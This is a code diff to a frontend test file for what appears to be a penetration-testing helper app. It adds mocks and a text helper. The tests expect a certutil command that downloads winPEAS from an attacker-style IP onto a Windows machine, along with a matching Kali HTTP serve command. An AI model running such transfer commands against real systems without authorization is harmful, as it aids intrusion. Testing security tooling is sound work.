@@ -12,6 +12,7 @@ import type { LogEntryInput } from "../types/log";
 import { usePaletteStore } from "../features/palette/usePaletteStore";
 import { useLastEngagementStore } from "../features/arsenal/useFillScope";
 import { api } from "../lib/api";
+import { commandText } from "./support/commandText";
 import { makeQueryClient } from "../lib/queryClient";
 import type { Engagement } from "../types/engagement";
 import type { Host } from "../types/host";
@@ -55,6 +56,8 @@ const mount = (path: string, engagement = E1) => {
 beforeEach(() => {
   localStorage.clear();
   vi.resetAllMocks();
+  m.hostIdentityGet.mockResolvedValue(null);
+  m.vectorsList.mockResolvedValue([]);
   useCaptureStore.getState().reset();
   usePaletteStore.getState().close();
   useLastEngagementStore.setState({ engagementId: "e1", hostId: "ms02" });
@@ -109,7 +112,7 @@ describe("Transfer a file", () => {
     // Another method is another tab; the serve command stays.
     await user.click(g.getByRole("tab", { name: "HTTP · certutil" }));
     expect(await pre(g, "certutil -urlcache -split -f http://10.10.14.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
-    expect(g.getByText("cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
+    expect(g.getByText(commandText("cd ~/tools/windows && python3 -m http.server 80"))).toBeInTheDocument();
   });
 
   it("the Kali half serves from the tool folders set in Settings", async () => {
